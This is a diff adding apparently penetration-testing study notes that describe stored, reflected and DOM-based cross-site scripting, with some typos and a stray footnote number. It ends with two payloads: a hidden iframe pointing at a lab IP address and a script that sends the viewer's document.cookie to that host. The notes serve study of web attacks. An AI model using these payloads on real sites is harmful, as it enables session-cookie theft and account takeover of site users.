@@ -1,0 +1,15 @@
+There are three Cross-Site-Scripting variants: stores, reflected and DOM-based
+
+Stored XSS attacks, also known as Persistent XSS, occurs when the exploit payload is stored in a database or otherwise cached by a server. The web application then retrieves this payload and displays it to anyone that views a vulnerable page. A single Stored XSS vulnerability can therefore attack all users of the site. Stored XSS vulnerabilities often exist in forum software, especially in comment sections, or in product reviews.
+
+Reflected XSS attacksusually include the payload in a crafted request or link. The web application takes this value and places it into the page content. This variant only attacks the person submitting the request or viewing the link. Reflected XSS vulnerabilities can often occur in search fields and results, as well as anywhere user input is included in error messages
+
+DOM-based XSS attacksare similar to the other two types, but take place solely within the page’s Document Object Model (DOM).261We won’t get into many details at this point, but a browser parses  a  page’s  HTML  content  and  generates  an  internal  DOM  representation.JavaScript  can programmatically interact with this DOM.
+
+Special characters:
+< > ' " { } ;
+
+<iframe src=http://192.168.119.199/report height="0" width="0"></iframe>
+
+<script>new Image().src="http://192.168.119.199/report?output="+document.cookie;</script>
+
